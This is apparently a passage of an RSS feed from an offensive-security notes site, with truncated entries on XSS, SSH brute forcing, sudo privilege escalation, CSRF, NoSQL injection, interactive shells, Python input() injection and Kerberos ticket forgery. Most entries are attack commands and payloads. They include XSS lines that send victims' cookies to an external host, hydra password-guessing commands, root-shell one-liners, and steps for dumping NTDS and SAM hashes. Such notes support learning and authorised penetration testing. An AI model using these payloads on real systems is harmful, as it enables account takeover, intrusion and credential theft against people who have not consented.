      <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot https://github.com/s0md3v/AwesomeXSS/ Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; Payloads # Document.location &amp;lt;script&amp;gt;document.location(&#39;http://IP_EXTERNE/&#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &#39;http://requestb.in/XXXXXX?cookies =&#39; + document.cookie;&amp;lt;/script&amp;gt; # Window &amp;lt;script&amp;gt;window.</description>
    </item>
    
    <item>
      <title>22 - SSH</title>
      <link>/network/services-enumeration/22_ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/22_ssh/</guid>
      <description>Recon # Banner grabbing using telnet telnet IP 22 Bruteforce # List of users using wordlists hydra -L users.txt -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh # Only one user and wordlist passwords hydra -l root -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh OpenSSL # Connection through openssl openssl s_client -connect IP:PORT </description>
    </item>
    
    <item>
      <title>Abusing Sudo Rights</title>
      <link>/linux-systems/privilege-escalation/abusing_sudo_rights/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/privilege-escalation/abusing_sudo_rights/</guid>
      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ CVE 2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash # If no TTY, you can restart SSH server and add your key sudo /etc/init.d/ssh restart echo &amp;#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms&amp;#39; &amp;gt; authorized_keys sudo -u#-1 bash Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;quot;/bin/sh&amp;quot;)}&amp;rsquo;    ed sudo /usr/bin/ed !</description>
    </item>
    
    <item>
      <title>AES Encryption</title>
      <link>/cryptography/aes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/cryptography/aes/</guid>
      <description>Retrieve AES Key and mount partition # Dump AES key aeskeyfind dump # Result 8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1 # Mount partition echo 8d3f527de514872f595908958dbc0ed1 | xxd -r -p &amp;gt; key.bin sudo cryptsetup luksFormat --verify-passphrase --cipher=aes-ecb --hash=sha1 --key-size=128 --master-key-file=key.bin dump sudo cryptsetup luksOpen dump test sudo mount -t ext4 /dev/mapper/test /mnt/media sudo ls /mnt/media/dir2 Decipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d&amp;#39; ----&amp;gt; SHA-256 de &amp;#39;mcsTnTld1dDn&amp;#39;: # Decipher openssl enc -aes-256-cbc -d -in Confidentiel.</description>
    </item>
    
    <item>
      <title>Aquatone</title>
      <link>/web-pentest/applicative-scans/aquatone/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/applicative-scans/aquatone/</guid>
      <description>Aquatone # Aquatone is a complete tool separate in three commands to make complete recon # Collector modules : # Dictionary brute force # DNSDB.org # Google Transparency Report # HackerTarget # Netcraft # Shodan (API key needed) # ThreatCrowd # VirusTotal (API key needed) # PHASE 1 : Discovery # aquatone-discover is the first step # It uses name servers and performs some test to see if wildcard is configured # Then it asks each subdomain collector for potential subdomain # Then it tries to resolve them to see which ones are up and creates the hosts.</description>
    </item>
    
    <item>
      <title>CSRF Injections</title>
      <link>/web-pentest/injections/client-side-injections/csrf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/client-side-injections/csrf/</guid>
      <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt; # Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; # Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
    </item>
    
    <item>
      <title>Darkweb Investigation</title>
      <link>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</guid>
      <description>[WIP]
Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/ # Dark Web Searching https://www.osintcombine.com/post/dark-web-searching # Conducting OSINT on .onion sites https://www.osintme.com/index.php/2019/11/24/darknet-diving-conducting-osint-on-onion-sites/ # List of darknet markets for investigators https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/ https://webhose.io/blog/dark-web/the-top-5-dark-web-search-engines/ # - Candle # - Torch # - Kilos # - AHMIA # - Tor77 # - Darksearch </description>
    </item>
    
    <item>
      <title>Defensive Active Directory</title>
      <link>/defensive-monitoring-cti/defensive_active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/defensive-monitoring-cti/defensive_active_directory/</guid>
      <description>Resources (cross-post resources) # Talk by Riccardo Ancarani &amp;#34;Detecting Resilient Adversaries - Active Directory&amp;#34; # Prevention/Detection # - DCSync # - AdminSDHolder # - Ticket Forgery # - DSRM # - Skeleton Key # - DCShadow https://raw.githubusercontent.com/RiccardoAncarani/talks/master/r00tMI/20200709-r00tMi-ADDtalk_v1.0.pdf BloodHound for defense https://posts.specterops.io/bloodhound-versus-ransomware-a-defenders-guide-28147dedb73b # Great post explaining how BloodHound can be used by defenders </description>
    </item>
    
    <item>
      <title>Domain &amp; URLs</title>
      <link>/open-source-intelligence-osint/technical-recon/domains_urls/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/domains_urls/</guid>
      <description>Getting Informations Get information on an IP whois &amp;lt;IP&amp;gt; # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Knockknock is a small automated script allowing you to find domain names # For a registrant (person or company) python3 k2.py -n company -d # Many tools https://intelx.io/ # Estimate the creation date of a website http://carbondate.cs.odu.edu/ https://github.com/Lazza/Carbon14 Online Passive Identification Tools Target Mapping and Informations # Informations about the target https://securitytrails.</description>
    </item>
    
    <item>
      <title>Domain Recon</title>
      <link>/windows-systems/network-and-domain-recon/domain_recon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/network-and-domain-recon/domain_recon/</guid>
      <description>Tips # Enumerate sessions net session \\computer Domain Properties rpcclient # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 enum4linux # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.fr .</description>
    </item>
    
    <item>
      <title>Drupal</title>
      <link>/web-pentest/content-management-system-cms/drupal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/drupal/</guid>
      <description>https://github.com/gfoss/attacking-drupal
Tips &amp;amp; Tricks # Manual user enumeration # Step 1 : check for existing user # 403 --&amp;gt; User exist # 404 --&amp;gt; User doesn&amp;#39;t exist https://www.site.com/user/x # Then you can get username https://www.site.com/reset/user/x/1/1 Droopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joomla, Moodle, Drupal) droopescan --help droopescan scan --help # Target Identification droopescan scan drupal -u example.org droopescan scan drupal -U list_of_urls.txt # You can also ommit the drupal argument, so it will trigger the cms identification droopescan scan -u example.</description>
    </item>
    
    <item>
      <title>E-mails</title>
      <link>/open-source-intelligence-osint/human-recon/email/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/email/</guid>
      <description>Tips &amp;amp; Tricks https://twitter.com/henkvaness/status/1308417260848062464 # Using Google Dorks you can search for e-mails like this # It can helps in identifying one target specific e-mail address # &amp;#34;john doe &amp;#34; &amp;#34;john * * com&amp;#34; Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # Omail can find domain syntax as well as related e-mails addresses https://omail.io/ # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ https://verifalia.com/validate-email # IntelX new tool allows to browse records for a given domain https://phonebook.</description>
    </item>
    
    <item>
      <title>File Upload</title>
      <link>/web-pentest/files-and-files-inclusions/file_upload/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/files-and-files-inclusions/file_upload/</guid>
      <description>File Upload are well known and kinda old PHP vulnerabilities but can still work some times Double Extension # If the target is only checking extension → exploit.php.jpg MIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F &amp;#34;file=@shell.php;type=image/gif&amp;#34; --cookie &amp;#34;...&amp;#34; &amp;#34;&amp;lt;target&amp;gt;&amp;#34; # You can also create or update the following registry key on Windows {{HKLM\SOFTWARE\Classes\.php}} # Then create a “String” type registry key and, named “Content-Type&amp;#34; and set the value “image/gif” Null Byte → exploit.</description>
    </item>
    
    <item>
      <title>FREEIPA</title>
      <link>/other-systems/freeipa/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/freeipa/</guid>
      <description>What is FreeIPA ? https://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1 # Open source alternative to Microsoft Windows Active Directory # Primarily used as an integrated management solution for Unix environments. # Similar to Active Directory, FreeIPA implements a full LDAP directory infrastructure # So all together we have a Unix host management system # Complete with LDAP and Kerberos that allows for multi-factor authentication. Informations Files # Kerberos informations to get enrolled (location of KDCs.</description>
    </item>
    
    <item>
      <title>Fully Interactive TTY Shell</title>
      <link>/shells-methods/tty_full/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/tty_full/</guid>
      <description>MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port # Another way to get a better shell # script is almost everytime present on the machine /usr/bin/script -qc /bin/bash /dev/null Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt; Spawning a shell # Using os.</description>
    </item>
    
    <item>
      <title>Gasmak</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/</guid>
      <description>General Informations https://github.com/twelvesec/gasmask # All in one information gathering tool # Automated tool used to gather information on the following sources : # - ask, bing, crt, censys.io, dns, dnsdumpster, dogpile, github # - google, googleplus, instagram, linkedin, netcraft, pgp # - reddit, reverse dns, twitter, vhosts, virustotal, whois, # - yahoo, yandex, youtube # 2 modes : Basic &amp;amp; Nongoogle # - whois/dns/reverse DNS/bing virtual hosts # - search in other engines # API Keys needed : shodan, censys, Usage ______ __ ___ __ __ / ____/___ ______/ |/ /___ ______/ //_/ / / __/ __ `/ ___/ /|_/ / __ `/ ___/ ,&amp;lt; / /_/ / /_/ (__ ) / / / /_/ (__ ) /| | \____/\__,_/____/_/ /_/\__,_/____/_/ |_| GasMasK - All in one Information gathering tool - OSINT Ver.</description>
    </item>
    
    <item>
      <title>John Cheatsheet</title>
      <link>/passcracking-hashfiles/john_cheatsheet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/passcracking-hashfiles/john_cheatsheet/</guid>
      <description>Cracking Modes # Dictionnary attack ./john --wordlist=password.lst hashFile # Dictionnary attack using default or specific rules ./john --wordlist=password.lst --rules=rulename hashFile ./john --wordlist=password.lst --rules mypasswd # Incremental mode ./john --incremental hashFile # Loopback attack (password are taken from the potfile) ./john --loopback hashFile # Mask bruteforce attack ./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8 # Dictionnary attack using masks ./john --wordlist=password.lst -mask=&amp;#39;?l?l?w?l&amp;#39; hashFile MISC &amp;amp; Tricks # Show hidden options ./john --list=hidden-options # Using session and restoring them .</description>
    </item>
    
    <item>
      <title>LDAP &amp; DNS</title>
      <link>/network/ldap_dns/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/ldap_dns/</guid>
      <description>LDAP Null Bind Enumeration # Syntax ldapsearch -h &amp;#34;LENOMDELAMACHINELDAP&amp;#34; -p &amp;#34;LEPORTSURLEQUELONYACCEDE&amp;#34; -x -b &amp;#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&amp;#34; -v DNS Zone Transfer # Zone transfer using dig dig @&amp;lt;ns&amp;gt; -p 54011 AXFR &amp;lt;host&amp;gt; # Zone transfer using nslookup nslookup -type=any &amp;gt; set port &amp;lt;port&amp;gt; &amp;gt; server &amp;lt;ns&amp;gt; &amp;gt; &amp;lt;host&amp;gt; # Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j&amp;#39;ai bien installe le module Net::DNS print Net::DNS-&amp;gt;version, &amp;#34;\n&amp;#34;; # creation de l&amp;#39;instance du resolveur maison.</description>
    </item>
    
    <item>
      <title>LinkedIn</title>
      <link>/open-source-intelligence-osint/platforms-hunting/linkedin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/linkedin/</guid>
      <description>Tips &amp;amp; Tricks # Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources # Getting likes, comment etc. /detail/recent-activity Getting account linked to an e-mail # Great trick https://www.intelligencewithsteve.com/post/a-guide-to-searching-linkedin-by-email-address # Sales feature have been discontinued # Log to OWA and go to contacts https://outlook.live.com/owa/ https://outlook.live.com/people # Then add contact, using the target e-mail # Go to the LinkedIn tab and connect using a fake account # If an account is linked to the target e-mail, you should now see it in Outlook ScrapedIn # Tool created to assist in performing recon using the LinkedIn API.</description>
    </item>
    
    <item>
      <title>Lockpicking and Keys stuff</title>
      <link>/phishing-redteam-and-se/lockpicking_keys/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/phishing-redteam-and-se/lockpicking_keys/</guid>
      <description>Key Decoder https://github.com/MaximeBeasse/KeyDecoder https://twitter.com/FrenchKey_fr/status/1343543963454754816?s=20 </description>
    </item>
    
    <item>
      <title>Nmap Cheatsheet</title>
      <link>/network/port-scanning/nmap_cheatsheet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/port-scanning/nmap_cheatsheet/</guid>
      <description>https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
    </item>
    
    <item>
      <title>NoSQL Injections</title>
      <link>/web-pentest/injections/server-side-injections/nosql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/nosql/</guid>
      <description>NoSQLMap https://github.com/codingo/NoSQLMap 1-Set options (do this first) 2-NoSQL DB Access Attacks 3-NoSQL Web App attacks 4-Scan for Anonymous MongoDB Access x-Exit Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=.1 # Enumeration index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=3a.20 </description>
    </item>
    
    <item>
      <title>OPSEC</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/opsec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/opsec/</guid>
      <description>[WIP]
Resources https://github.com/devbret/online-opsec/ https://anonymousplanet.github.io/thgtoa/guide.html Technical OPSEC # Simple data analysis (headers, OS...) https://amiunique.org/fp # Creating profile pictures for sock # Mixing two pictures https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ # Email providers comparison https://www.privacytools.io/providers/email/ # Compilation of great ressources https://shutuptrackers.com/index.php # Windows 10 Tracking https://github.com/10se1ucgo/DisableWinTracking # Firefox Configuration Posts https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac # Browserling allow you to do cross-browser testing https://www.browserling.com/ # A directory of direct links for you to obtain your data from web services. https://justgetmydata.</description>
    </item>
    
    <item>
      <title>OSINT</title>
      <link>/resources/osint/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/resources/osint/</guid>
      <description>Social Networks  The new Facebook Graph Search Part 1 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-1/) The new Facebook Graph Search Part 2 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-2/) Find Instagram User ID (https://codeofaninja.com/tools/find-instagram-user-id) Using Snapchat for OSINT (https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/) TikTok investigations and OSINT Tips (https://www.skopenow.com/news/tiktok-investigations-and-osint-tips)s How can we use Messenger Apps in OSINT (https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f) A better way to find and archive OSINT on Twitter (https://jakecreps.com/2020/04/10/threadreaderapp-osint-archive-twitter/amp/) OSINT : How to find information on anyone (https://medium.com/the-first-digit/osint-how-to-find-information-on-anyone-5029a3c7fd56) Getting a Grasp on Google ID&amp;rsquo;s (https://medium.</description>
    </item>
    
    <item>
      <title>Parameters</title>
      <link>/web-pentest/resources-discovery/parameters/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/resources-discovery/parameters/</guid>
      <description>Hidden parameters Comparison https://4rt.one/blog/1.html x8 https://github.com/sh1yo/x8 # Send parameters via query x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; # With some default parameters: x8 -u &amp;#34;https://example.com/?something=1&amp;#34; -w &amp;lt;wordlist&amp;gt; # Send parameters via body x8 -u &amp;#34;https://example.com/&amp;#34; -X POST --as-body -w &amp;lt;wordlist&amp;gt; Arjun # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.</description>
    </item>
    
    <item>
      <title>PHP Functions</title>
      <link>/web-pentest/php-vulnerabilities/functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/functions/</guid>
      <description>Assert() # The assert() function will execute code in params # Example using challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
    </item>
    
    <item>
      <title>Physical Access</title>
      <link>/windows-systems/local-and-physical/physical_access/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/local-and-physical/physical_access/</guid>
      <description>Live boot from Kali # - USB Live Kali # - Mount the Windows system disk # - Get SAM and SYSTEM files from &amp;#34;C:\Windows\System32\config\&amp;#34; # - Extract hashes → samdump2 SYSTEM SAM &amp;gt; hash.txt # - Crack hashes using JTR (john -format=NT hash.txt) or Hashcat # - You may have to use “bkhive&amp;#34; on the SYSTEM file first # - John format can also be NT2 Utilman.exe attack # You can access a SYSTEM cmd shell if you have access to the filesystem # utilman.</description>
    </item>
    
    <item>
      <title>Postman</title>
      <link>/web-pentest/tools/postman/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/tools/postman/</guid>
      <description>https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ User Interface Header # Import --&amp;gt; Used to import collection or environment. # Runner --&amp;gt; Automation tests can be executed through the Collection Runner. # Workspace --&amp;gt; You can divide work using workspaces Sidebar # History --&amp;gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --&amp;gt; your test suite by creating collections.</description>
    </item>
    
    <item>
      <title>Python</title>
      <link>/linux-systems/programing-languages/python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/programing-languages/python/</guid>
      <description>Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code  Please enter password : sys.stdout.write(open(&amp;#34;.passwd&amp;#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /challenge/shell/shell6/.passwd &amp;gt; /tmp/flag&amp;#39;) cat /tmp/flag # Another Please enter password : __import__(&amp;#39;shutil&amp;#39;).copyfile(&amp;#39;/challenge/shell/shell6/.passwd&amp;#39;, &amp;#39;/tmp/flag2&amp;#39;) # You can even get a shell Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) # Another Please enter password : input(open(&amp;#34;.</description>
    </item>
    
    <item>
      <title>Recon and Enumeration</title>
      <link>/linux-systems/recon_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/recon_enumeration/</guid>
      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 Basics hostname whoami id ifconfig uname -a uname -m # Check version using  searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
    </item>
    
    <item>
      <title>Remote Execution Techniques</title>
      <link>/windows-systems/exploitation/remote_execution_techniques/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/remote_execution_techniques/</guid>
      <description>Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket # psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP &amp;lt;command&amp;gt; # smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here.  # Instantiating a local smbserver to receive the output of the commands.  # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP &amp;lt;command&amp;gt; # atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</description>
    </item>
    
    <item>
      <title>Rogue AP Attack</title>
      <link>/wireless/rogue_ap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/wireless/rogue_ap/</guid>
      <description>General Informations # If you need several external eth interfaces, connect then at the beginning # To ensure having wlan0 and wlan1 # And avoid having wlan0mon and then wlan0 when you connect the second one # It could result in conflicts # Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies # Manually creating a rogue AP for classical WPA/WPA2 requires more configuration # You might need to patch your hostapd version https://github.</description>
    </item>
    
    <item>
      <title>Silver and Golden Tickets</title>
      <link>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</guid>
      <description>Ticket generation from Linux # Generate a ticket or convert it (kekeo) to ccache format $ ticketer.py -nthash &amp;lt;hash&amp;gt; -domain-sid &amp;lt;sid&amp;gt; -domain &amp;lt;domain&amp;gt; &amp;lt;user&amp;gt; # Export the path in the right variable $ export KRB5CCNAME=/tmp/ticket.ccache $ klist # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrateur) &amp;gt; Nom complet du domaine (domain.</description>
    </item>
    
    <item>
      <title>Tricks</title>
      <link>/windows-systems/privilege-escalation/tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/tricks/</guid>
